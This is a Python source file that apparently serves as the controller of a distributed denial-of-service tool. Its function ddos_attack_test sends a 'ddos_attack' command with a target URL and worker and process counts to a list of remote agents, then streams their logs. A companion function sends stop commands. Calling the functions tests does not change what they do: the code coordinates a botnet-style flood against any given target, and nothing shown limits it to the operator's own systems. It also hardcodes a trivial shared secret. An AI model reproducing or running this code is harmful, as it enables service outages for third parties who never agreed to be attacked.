import requests
import logging

logger = logging.getLogger(__name__)

def ddos_attack_test(base_url, options):
    """
    Dispatches a DDOS command to remote agents.
    Expects options to contain:
      - base_url: The target URL,
      - workers: Number of worker processes,
      - processes_per_worker: Number of processes per worker,
      - agents: List of agent addresses (e.g. "192.168.1.101:5000" or "http://192.168.1.101:5000")
    """
    target_base_url = options.get("target_url") or options.get("base_url")
    workers = options.get("workers")
    processes_per_worker = options.get("processes_per_worker")
    agents = options.get("agents") or options.get("selected_agents", [])

    if not target_base_url or workers is None or processes_per_worker is None or not agents:
        err_msg = ("DDOS attack configuration error: 'base_url'/ 'target_url', 'workers' and "
                   "'processes_per_worker' must be provided along with a non-empty 'agents' list.")
        logger.error(err_msg)
        return {"error": err_msg}

    for agent in agents:
        # If the agent string already contains "http://" or "https://", remove it.
        if agent.startswith("http://"):
            agent = agent[len("http://"):]
        elif agent.startswith("https://"):
            agent = agent[len("https://"):]

        try:
            payload = {
                "command": "ddos_attack",
                "params": {
                    "base_url": target_base_url,
                    "workers": workers,
                    "processes_per_worker": processes_per_worker
                }
            }
            headers = {"X-SECRET-KEY": "secret"}  # Must match the agent's secret key
            logger.info("Dispatching DDOS command to agent %s with payload: %s", agent, payload)
            
            response = requests.post(
                f"http://{agent}/execute", 
                json=payload, 
                headers=headers, 
                stream=True, 
                timeout=60
            )
            if response.status_code == 200:
                logger.info("Receiving realtime logs from agent %s", agent)
                for line in response.iter_lines():
                    if line:
                        decoded_line = line.decode('utf-8')
                        logger.info("Agent %s: %s", agent, decoded_line)
            else:
                logger.error("Agent %s returned an error: %s", agent, response.text)
        except Exception as e:
            logger.exception("Exception occurred while sending command to agent %s: %s", agent, str(e))
    
    return {"message": "DDOS commands dispatched to all agents. Realtime logs are being streamed in the server logs."}

def ddos_stop_attack_test(options):
    """
    Dispatches stop commands to remote agents to halt a DDOS attack.
    Expects options to contain:
      - agents: List of agent addresses.
    """
    agents = options.get("agents", [])
    if not agents:
        err_msg = "DDOS stop command error: No agents provided."
        logger.error(err_msg)
        return {"error": err_msg}

    headers = {"X-SECRET-KEY": "secret"}
    results = {}
    for agent in agents:
        try:
            logger.info("Sending stop command to agent %s", agent)
            response = requests.post(f"http://{agent}/stop", headers=headers, timeout=10)
            if response.status_code == 200:
                results[agent] = response.json()
                logger.info("Agent %s stopped successfully: %s", agent, response.json())
            else:
                results[agent] = {"error": response.text}
                logger.error("Agent %s returned an error on stop: %s", agent, response.text)
        except Exception as e:
            results[agent] = {"error": str(e)}
            logger.exception("Exception occurred while sending stop command to agent %s: %s", agent, str(e))
    
    return {"message": "Stop commands dispatched to all agents.", "results": results}
